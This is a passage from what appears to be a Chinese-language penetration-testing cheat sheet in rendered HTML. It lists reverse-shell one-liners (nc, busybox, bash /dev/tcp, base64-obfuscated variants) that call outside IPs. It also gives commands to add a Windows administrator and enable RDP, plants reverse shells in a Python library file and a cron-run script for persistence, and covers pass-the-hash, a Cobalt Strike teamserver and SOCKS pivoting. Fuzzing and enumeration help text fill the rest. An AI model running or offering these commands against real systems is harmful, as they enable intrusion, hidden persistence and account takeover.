class="hljs-string">&quot;0.0.0.0&quot;</span><br><span class="hljs-attr">webServer.port</span> = <span class="hljs-number">13332</span><br><span class="hljs-attr">webServer.user</span> = <span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-attr">webServer.password</span> = <span class="hljs-string">&quot;admin888&quot;</span><br></code></pre></td></tr></table></figure><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">nc 47.120.32.120 10000| /bin/bash | nc 47.120.32.120 10001      <span class="hljs-comment">#双通道</span><br><br>busybox nc 10.2.26.216 7777 -e sh<br><br>bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/10.2.26.216/7777 0&gt;&amp;1&#x27;</span><br><br>bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(base64 -d&lt;&lt;&lt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjI2LjIxNi83Nzc3IDA+JjE=)</span>&quot;</span><br><br><span class="hljs-built_in">echo</span> YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjI2LjIxNi83Nzc3IDA+JjEnCg==|<span class="hljs-built_in">base64</span> -d|bash<br><br>bash&lt;&lt;&lt;$(<span class="hljs-built_in">base64</span> -d&lt;&lt;&lt;<span class="hljs-string">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjI2LjIxNi83Nzc3IDA+JjEnCg==)</span><br></code></pre></td></tr></table></figure><h2 id="优化tty"><a href="#优化tty" class="headerlink" title="优化tty"></a>优化tty</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>export SHELL=bash<br>export TERM=xterm-256color<br><span class="hljs-meta prompt_"># </span><span class="language-bash">ctrl+Z</span><br>stty raw -echo;fg<br>reset<br></code></pre></td></tr></table></figure><h1 id="添加管理员RDP"><a href="#添加管理员RDP" class="headerlink" title="添加管理员RDP"></a>添加管理员RDP</h1><p>有时需要配置防火墙允许3389端口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net user bridge huawei /add<br>net localgroup administrators bridge /add<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br></code></pre></td></tr></table></figure><h1 id="工具-命令"><a href="#工具-命令" class="headerlink" title="工具/命令"></a>工具/命令</h1><h2 id="amass"><a href="#amass" class="headerlink" title="amass"></a>amass</h2><p>子域名收集方法集成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">amass -d kali.org# 不推荐，将耗费极其长的时间<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">子命令：<br>amass intel - 发现枚举目标<br>amass enum - 执行枚举和网络映射<br>amass db - 管理存储枚举结果的图数据库<br></code></pre></td></tr></table></figure><h3 id="intel"><a href="#intel" class="headerlink" title="intel"></a>intel</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">用法：amass intel [options] [-whois -d DOMAIN] [-addr ADDR -asn ASN -cidr CIDR]<br><br>-active<br>尝试获取证书名称<br>-addr 值<br>IP 地址和地址范围 (192.168.1.1-254)，以逗号分隔<br>-asn 值<br>ASN 以逗号分隔（可多次使用）<br>-cidr 值<br>CIDR 以逗号分隔（可多次使用）<br>-config 字符串<br>YAML 配置文件的路径。以下为更多详细信息<br>-d 值<br>域名以逗号分隔（可多次使用）<br>-demo<br>审查输出以使其适合演示<br>-df 值<br>提供根域名的文件路径<br>-dir 字符串<br>包含输出文件的目录路径<br>-ef 字符串<br>提供要排除的数据源的文件路径<br>-exclude 值<br>以逗号分隔的要排除的数据源名称<br>-h 显示程序使用信息<br>-help<br>显示程序使用信息<br>-if 字符串<br>提供要包含的数据源的文件路径<br>-include 值<br>以逗号分隔的要包含的数据源名称<br>-ip<br>显示已发现名称的 IP 地址<br>-ipv4<br>显示已发现名称的 IPv4 地址<br>-ipv6<br>显示已发现名称的 IPv6 地址<br>-list<br>打印其他信息<br>-log 字符串<br>写入错误的日志文件路径<br>-max-dns-queries 整数<br>最大并发 DNS 查询数<br>-o 字符串<br>包含终端 stdout/stderr 的文本文件路径<br>-org 字符串<br>根据 AS 描述信息提供的搜索字符串<br>-p 值<br>端口号（以逗号分隔）（默认值：80, 443）<br>-r 值<br>首选 DNS 解析器的 IP 地址（可多次使用）<br>-rf 值<br>提供首选 DNS 解析器的文件路径<br>-timeout 整数<br>退出前允许枚举运行的分钟数<br>-v 输出状态/调试/故障排除信息<br>-whois<br>所有提供的域名均经过反向 whois 查询<br></code></pre></td></tr></table></figure><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs shell">用法：amass 枚举 [选项] -d DOMAIN<br><br>-active<br>尝试区域传输和证书名称抓取<br>-addr 值<br>IP 地址和地址范围 (192.168.1.1-254)，以逗号分隔<br>-alts<br>启用更改名称生成<br>-asn 值<br>ASN 以逗号分隔（可多次使用）<br>-aw 值<br>用于更改名称的不同词表文件的路径<br>-awm 值<br>用于名称更改的“hashcat 风格”词表掩码<br>-bl 值<br>不予调查的子域名黑名单<br>-blf 字符串<br>提供黑名单子域名的文件路径<br>-brute<br>搜索后执行暴力破解<br>-cidr 值<br>CIDR 以逗号分隔（可多次使用）<br>-config 字符串<br>YAML 配置文件的路径。以下为更多详细信息<br>-d 值<br>域名以逗号分隔（可多次使用）<br>-demo<br>审查输出以使其适合演示<br>-df 值<br>提供根域名的文件路径<br>-dir 字符串<br>包含输出文件的目录路径<br>-dns-qps 整数<br>所有解析器每秒的最大 DNS 查询数<br>-ef 字符串<br>提供要排除的数据源的文件路径<br>-exclude 值<br>要排除的数据源名称以逗号分隔<br>-h 显示程序使用信息<br>-help<br>显示程序使用信息<br>-if 字符串<br>提供要包含的数据源的文件路径<br>-iface 字符串<br>提供用于发送流量的网络接口<br>-include 值<br>要包含的数据源名称以逗号分隔<br>-list<br>打印所有可用数据源的名称<br>-log 字符串<br>将写入错误的日志文件路径<br>-max-depth 整数<br>用于暴力破解的最大子域名标签数量<br>-max-dns-queries 整数<br>已弃用且将被替换的标志由 dns-qps 在 4.0 版本中提供<br>-min-for-recursive int<br>递归暴力破解前看到的子域名标签（默认值：1）（默认 1）<br>-nf 值<br>提供已知子域名（来自其他工具/来源）的文件路径<br>-nocolor<br>禁用彩色输出<br>-norecursive<br>关闭递归暴力破解<br>-o 字符串<br>包含终端 stdout/stderr 的文本文件路径<br>-oA 字符串<br>用于命名所有输出文件的路径前缀<br>-p 值<br>以逗号分隔的端口（默认值：80, 443）<br>-passive<br>已弃用，因为默认设置是 passive<br>-r 值<br>不受信任 DNS 解析器的 IP 地址（可多次使用）<br>-rf 值<br>提供不受信任 DNS 解析器的文件路径<br>-rqps int<br>每个不受信任解析器每秒的最大 DNS 查询次数<br>-scripts 字符串<br>包含 ADS 的目录路径脚本<br>-silent<br>执行期间禁用所有输出<br>-timeout int<br>退出前枚举运行的分钟数<br>-tr 值<br>可信 DNS 解析器的 IP 地址（可多次使用）<br>-trf 值<br>提供可信 DNS 解析器的文件路径<br>-trqps int<br>每个可信解析器每秒的最大 DNS 查询次数<br>-v 输出状态/调试/故障排除信息<br>-w 值<br>用于暴力破解的不同字典文件的路径<br>-wm 值<br>用于 DNS 暴力破解的“hashcat 风格”字典掩码<br></code></pre></td></tr></table></figure><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash# 以动态链接库启动bash，可以突破额外添加在原本bash上的限制，例如ash<br></code></pre></td></tr></table></figure><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">crontab -l# 查看当前用户的 cron 任务<br></code></pre></td></tr></table></figure><h2 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">服务端teamserver</span><br>./teamserver 192.168.1.100 mypassword123 # 启动，设置了ip地址和密码，默认端口为50050，端口进文件里改，这是个sh文件。<br><br><br></code></pre></td></tr></table></figure><h2 id="curl-1"><a href="#curl-1" class="headerlink" title="curl"></a>curl</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h2 id="danted"><a href="#danted" class="headerlink" title="danted"></a>danted</h2><p>内网穿透</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 设置配置文件 /etc/danted.conf</span><br>logoutput: /var/log/danted.log<br>internal: 0.0.0.0 <span class="hljs-attr">port</span> = <span class="hljs-number">59999</span>  <span class="hljs-comment"># 监听所有 IP 的 1080 端口</span><br>external: 103.199.16.14             <span class="hljs-comment"># 替换为你的公网 IP</span><br>clientmethod: none<br>socksmethod: none<br>user.privileged: proxy<br>user.unprivileged: nobody<br>client pass &#123;<br>    from: 0.0.0.0/0 to: 0.0.0.0/0<br>    log: connect disconnect error<br>&#125;<br>socks pass &#123;<br>    from: 0.0.0.0/0 to: 10.10.0.0/16  <span class="hljs-comment"># 仅允许访问 10.10.xxx.xxx</span><br>    log: connect disconnect error<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl restart danted# 启动<br></code></pre></td></tr></table></figure><h2 id="df"><a href="#df" class="headerlink" title="df"></a>df</h2><p>检查磁盘空间使用情况</p><p>显示所有挂载的文件系统的可用空间和已用空间，包括每个文件系统的总大小、已用空间、可用空间以及已用空间的百分比</p><p>存在**/sys/fs/cgroup**，说明你在docker容器里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@7546fa2336d6:/# df<br>Filesystem     1K-blocks    Used Available Use% Mounted on<br>overlay         20509264 7633420  11810988  40% /<br>tmpfs              65536       0     65536   0% /dev<br>tmpfs             245328       0    245328   0% /sys/fs/cgroup<br>shm                65536       0     65536   0% /dev/shm<br>/dev/xvda1      20509264 7633420  11810988  40% /opt/clean<br>tmpfs             245328       0    245328   0% /proc/acpi<br>tmpfs             245328       0    245328   0% /proc/scsi<br>tmpfs             245328       0    245328   0% /sys/firmware<br></code></pre></td></tr></table></figure><h2 id="dirsx"><a href="#dirsx" class="headerlink" title="dirsx"></a>dirsx</h2><p>目录扫描</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\dirsx.exe <span class="hljs-literal">-u</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">80.155</span>/<br></code></pre></td></tr></table></figure><h2 id="dpkg"><a href="#dpkg" class="headerlink" title="dpkg"></a>dpkg</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dpkg -i rustscan_2.4.1-1_amd64.deb# 基于 Debian 的 Linux 发行版（如 Debian、Ubuntu 及其衍生版）从 .deb 文件安装软件包<br></code></pre></td></tr></table></figure><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.2.26.216&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27; &gt;&gt; /usr/lib/python3.8/base64.py<br><br>echo &#x27;bash -i &gt;&amp; /dev/tcp/10.2.26.216/7777 0&gt;&amp;1&#x27; &gt;&gt; clean.sh<br></code></pre></td></tr></table></figure><h2 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 PtH 连接到 WinRM</span><br>evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH<br></code></pre></td></tr></table></figure><h2 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h2><p>读取、写入和操作图像、音频、视频和 PDF 元数据。</p><h2 id="export"><a href="#export" class="headerlink" title="export"></a>export</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export IP=*.*.*.*# 设置环境变量<br></code></pre></td></tr></table></figure><h2 id="feroxbuster"><a href="#feroxbuster" class="headerlink" title="feroxbuster"></a>feroxbuster</h2><p>目录扫描</p><p>rust，很快</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">feroxbuster -u http://10.10.28.167/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>feroxbuster -u http://10.10.147.99/ -w /usr/share/wordlists/dirb/big.txt<br></code></pre></td></tr></table></figure><h2 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">ffuf -u http://10.10.235.83/yaml -H &quot;Content-Type: application/json&quot; -X POST -d &#x27;&#123;&quot;file_path&quot;:&quot;FUZZ.yaml&quot;&#125;&#x27; -w wordlist.txt<br><br>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://WIN-12OUO7A66M7.thm.local/FUZZ -fw 1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">子域名</span><br>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://futurevera.thm -H &quot;Host:FUZZ.futurevera.thm&quot; -fw 1 -c<br>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.10.154.132 -H &quot;Host:FUZZ.futurevera.thm&quot; -fs 4605 -c# -u 最好用ip,而不是域名，用域名有时爆不出<br>ffuf -w SecLists/Discovery/Web-Content/common.txt -H &quot;Host: FUZZ.futurevera.thm&quot; -u https://10.10.140.236 -fs 4605 -c<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">POST参数</span><br>ffuf -u &#x27;http://admin.cyprusbank.thm/settings&#x27; -X POST -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -H &#x27;Cookie: connect.sid=s%3AMwjzKA3EcBUXIsqGNDDaHARGh5B7JYwk.jwhk7KbGBNbC46HXtU8Ln%2BqMzdigbh1ZTMDnal6RC24&#x27; -mc all -d &#x27;name=test&amp;password=test&amp;FUZZ=test&#x27; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098<br><br>ffuf -w wordlists/sql-login-bypass.txt -X POST -u http://10.10.236.146/login.php -d &#x27;username=FUZZ&amp;password=asdf&#x27; -H &quot;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&quot; -fw 227<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">GET参数</span><br>ffuf -u &#x27;http://10.10.29.18/assets/index.php?FUZZ=id&#x27; -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0<br><br></code></pre></td></tr></table></figure><p>参数说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs shell">HTTP 选项：<br>-H 标头“Name: Value”，以冒号分隔。接受多个 -H 参数。<br>-X 使用的 HTTP 方法<br>-b Cookie 数据“NAME1=VALUE1; NAME2=VALUE2”，用于复制为 curl 功能。<br>-cc 用于身份验证的客户端证书。客户端密钥也需要定义才能正常工作。<br>-ck 用于身份验证的客户端密钥。客户端证书也需要定义才能正常工作。<br>-d POST 数据<br>-http2 使用 HTTP2 协议（默认值：false）<br>-ignore-body 不获取响应内容。（默认值：false）<br>-r 遵循重定向（默认值：false）<br>-raw 不编码 URI（默认值：false）<br>-recursion 递归扫描。仅支持 FUZZ 关键字，并且 URL (-u) 必须以此关键字结尾。（默认值：false）<br>-recursion-depth 最大递归深度。 （默认值：0）<br>-recursion-strategy 递归策略：“default”表示基于重定向，“greedy”表示对所有匹配项进行递归（默认值：default）<br>-replay-proxy 使用此代理重放匹配的请求。<br>-sni 目标 TLS SNI，不支持 FUZZ 关键字。<br>-timeout HTTP 请求超时时间（秒）。（默认值：10）<br>-u 目标 URL<br>-x 代理 URL（SOCKS5 或 HTTP）。例如：http://127.0.0.1:8080 或 socks5://127.0.0.1:8080<br><br>常规选项：<br>-V 显示版本信息。（默认值：false）<br>-ac 自动校准过滤选项（默认值：false）<br>-acc 自定义自动校准字符串。可多次使用。隐含 -ac<br>-ach 每台主机自动校准（默认值：false）<br>-ack 自动校准关键字（默认值：FUZZ）<br>-acs 自定义自动校准策略。可多次使用。隐含 -ac<br>-c 为输出着色。（默认值：false）<br>-config 从文件加载配置<br>-json JSON 输出，打印以换行符分隔的 JSON 记录（默认值：false）<br>-maxtime 整个进程的最大运行时间（秒）。（默认值：0）<br>-maxtime-job 每个作业的最大运行时间（秒）。（默认值：0）<br>-noninteractive 禁用交互式控制台功能（默认值：false）<br>-p 请求之间的“延迟”秒数，或随机延迟范围。例如“0.1”或“0.1-2.0”<br>-rate 每秒请求速率（默认值：0）<br>-s 不打印附加信息（静默模式）（默认值：false）<br>-sa 所有错误情况下停止。隐含 -sf 和 -se。 （默认值：false）<br>-scraperfile 自定义抓取文件路径<br>-scrapers 活动抓取组（默认值：全部）<br>-se 出现虚假错误时停止（默认值：false）<br>-search 从 ffuf 历史记录中搜索 FFUFHASH 负载<br>-sf 当超过 95% 的响应返回 403 Forbidden 时停止（默认值：false）<br>-t 并发线程数（默认值：40）<br>-v 详细输出，打印完整 URL 和重定向位置（如果有）以及结果。（默认值：false）<br><br>匹配器选项：<br>-mc 匹配 HTTP 状态码，或使用“all”匹配所有内容。（默认值：200-299、301、302、307、401、403、405、500）<br>-ml 匹配响应中的行数<br>-mmode 匹配器集合运算符。可选：and 或 or（默认：or）<br>-mr 匹配正则表达式<br>-ms 匹配 HTTP 响应大小<br>-mt 匹配距第一个响应字节的毫秒数，大于或小于。例如：&gt;100 或 &lt;100<br>-mw 匹配响应中的字数<br><br>过滤选项：<br>-fc 过滤响应中的 HTTP 状态码。以逗号分隔的代码和范围列表<br>-fl 按响应中的行数过滤。以逗号分隔的行数和范围列表<br>-fmode 过滤集合运算符。可选：and 或 or（默认：or）<br>-fr 过滤正则表达式<br>-fs 过滤 HTTP 响应大小。以逗号分隔的大小和范围列表<br>-ft 按距第一个响应字节的毫秒数过滤，大于或小于。例如：&gt;100 或 &lt;100<br>-fw 按响应中的字数过滤。以逗号分隔的字数和范围列表<br><br>输入选项：<br>-D DirSearch 词表兼容模式。与 -e 标志一起使用。（默认值：false）<br>-e 以逗号分隔的扩展列表。扩展 FUZZ 关键字。<br>-enc 关键字编码器，例如“FUZZ:urlencode b64encode”<br>-ic 忽略词表注释（默认值：false）<br>-input-cmd 生成输入的命令。使用此输入法时需要 --input-num 参数。覆盖 -w 参数。<br>-input-num 待测试的输入数量。与 --input-cmd 参数一起使用。（默认值：100）<br>-input-shell 用于运行命令的 Shell。<br>-mode 多词表操作模式。可用模式：clusterbomb、pitchfork、sniper（默认值：clusterbomb）<br>-request 包含原始 http 请求的文件<br>-request-proto 与原始请求一起使用的协议（默认值：https）<br>-w 单词列表文件路径和（可选）关键字，以冒号分隔。例如：&#x27;/path/to/wordlist:KEYWORD&#x27;<br><br>输出选项：<br>-debug-log 将所有内部日志写入指定文件。<br>-o 输出到文件<br>-od 存储匹配结果的目录路径。<br>-of 输出文件格式。可用格式：json、ejson、html、md、csv、ecsv（或“all”表示所有格式）（默认值：json）<br>-or 如果没有结果，则不创建输出文件（默认值：false）<br><br>示例用法：<br>从 wordlist.txt 中模糊测试文件路径，匹配所有响应，但过滤掉内容大小为 42 的响应。<br>彩色详细输出。<br>ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v<br><br>模糊测试主机头，匹配 HTTP 200 响应。<br>ffuf -w hosts.txt -u https://example.org/ -H &quot;Host: FUZZ&quot; -mc 200<br><br>模糊测试 POST JSON 数据。匹配所有不包含文本“error”的响应。<br>ffuf -w entrys.txt -u https://example.org/ -X POST -H &quot;Content-Type: application/json&quot; \<br>-d &#x27;&#123;&quot;name&quot;: &quot;FUZZ&quot;, &quot;anotherkey&quot;: &quot;anothervalue&quot;&#125;&#x27; -fr &quot;error&quot;<br><br>模糊测试多个位置。仅匹配反映“VAL”关键字值的响应。颜色已显示。<br>ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr &quot;VAL&quot; -c<br></code></pre></td></tr></table></figure><h2 id="find-1"><a href="#find-1" class="headerlink" title="find"></a>find</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name &quot;Foo.txt&quot; 2&gt;/dev/null  # 查找名为Foo.txt的文件的路径<br>find / -iname &quot;*foo*txt&quot; 2&gt;/dev/null# 文件名模糊查找<br></code></pre></td></tr></table></figure><h2 id="ftp-1"><a href="#ftp-1" class="headerlink" title="ftp"></a>ftp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 